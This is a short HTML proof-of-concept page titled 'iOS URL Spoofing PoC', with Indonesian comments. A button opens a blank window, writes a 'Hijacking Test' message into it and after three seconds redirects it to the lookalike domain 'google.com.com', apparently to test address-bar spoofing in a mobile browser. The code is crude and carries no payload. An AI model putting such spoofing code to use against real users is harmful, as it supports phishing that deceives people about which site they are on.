<html>
<head>
  <title>iOS URL Spoofing PoC</title>
  <script>
    function spoofURL() {
      // Membuka tab baru dengan URL palsu
      let newWindow = window.open("about:blank", "spoofWindow");
      newWindow.document.write("<h1>Hijacking Test</h1><p>If successful, we will see a spoofed URL.</p>");
      
      setTimeout(function() {
        // Mengubah URL tab baru setelah beberapa detik
        newWindow.location.replace('https://www.google.com.com'); // URL spoofed
      }, 3000);
    }
  </script>
</head>
<body>
  <h1>Click to test URL spoofing</h1>
  <button onclick="spoofURL()">Click to Test</button>
</body>
</html>
